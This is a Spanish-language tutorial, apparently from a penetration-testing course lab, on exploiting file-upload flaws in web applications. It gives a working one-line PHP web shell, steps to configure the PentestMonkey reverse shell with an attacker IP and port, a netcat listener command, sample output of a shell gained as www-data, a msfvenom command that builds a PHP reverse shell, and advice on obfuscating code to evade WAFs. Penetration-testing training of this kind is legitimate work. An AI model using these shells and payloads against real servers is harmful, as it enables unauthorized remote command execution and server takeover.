## **Explotación de Aplicaciones Web Mediante Carga de Archivos Maliciosos**

### **Carga de Web Shells**

Una **Web Shell** es un script malicioso que proporciona acceso remoto al servidor a través de un navegador. Existen diversas opciones en línea con múltiples funcionalidades, como:

- **phpbash** (semi-interactivo con terminal).
- **Web shells de SecLists**, almacenados en `/opt/useful/seclists/Web-Shells` en PwnBox.

#### **Procedimiento de Explotación**

1. Descargar un web shell adecuado para el lenguaje del servidor, en este caso **PHP**.
2. Subir el archivo malicioso `phpbash.php` a la aplicación vulnerable.
3. Acceder a `http://SERVER_IP:PORT/uploads/phpbash.php`.
4. Ejecutar comandos en el servidor comprometido.

Esto nos permite enumerar directorios, transferir archivos y realizar otras acciones maliciosas.

#### **Creación de un Web Shell Manualmente**

Si no se dispone de herramientas en línea, se puede escribir un web shell básico en PHP:

```php
<?php system($_REQUEST['cmd']); ?>
```

- Guardar como `shell.php` y subirlo a la aplicación.
- Ejecutar comandos accediendo a:
    
    ```
    http://SERVER_IP:PORT/uploads/shell.php?cmd=id
    ```
    

Para mejorar la visibilidad en el navegador, se recomienda abrir la vista de código fuente con **CTRL+U**.

---

### **Carga de Reverse Shells**

Un **Reverse Shell** permite que el servidor comprometido se conecte a la máquina del atacante, proporcionando control interactivo.

#### **Uso de una Reverse Shell de PentestMonkey**

1. Descargar `php-reverse-shell.php`.
2. Modificar las líneas 49 y 50 con la IP y puerto del atacante:
    
    ```php
    $ip = 'OUR_IP';     // CAMBIAR ESTO
    $port = OUR_PORT;   // CAMBIAR ESTO
    ```
    
3. Iniciar un listener en el puerto especificado:
    
    ```
    nc -lvnp OUR_PORT
    ```
    
4. Subir el script a la aplicación y acceder a su enlace:
    
    ```
    http://SERVER_IP:PORT/uploads/reverse.php
    ```
    
5. Si la explotación es exitosa, se recibirá una conexión interactiva en Netcat:
    
    ```
    connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
    # id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    

---

### **Generación de Reverse Shells Personalizadas**

Se pueden generar payloads con `msfvenom` para optimizar la explotación:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

6. Iniciar un listener en Netcat.
7. Subir el script `reverse.php` y acceder a su enlace.
8. Recibir la conexión remota.

---

### **Consideraciones de Seguridad**

- **Firewalls y restricciones** pueden bloquear conexiones salientes, afectando la ejecución de reverse shells.
- **Web Application Firewalls (WAFs)** pueden detectar funciones peligrosas (`system()`, `eval()`, etc.), requiriendo técnicas de evasión avanzadas.
- **El uso de web shells puede ser detectado**, por lo que se recomienda ofuscar el código o usar métodos alternativos como técnicas de tunneling.

En resumen, las **web shells** permiten control rápido mediante HTTP, mientras que las **reverse shells** ofrecen una conexión más estable e interactiva.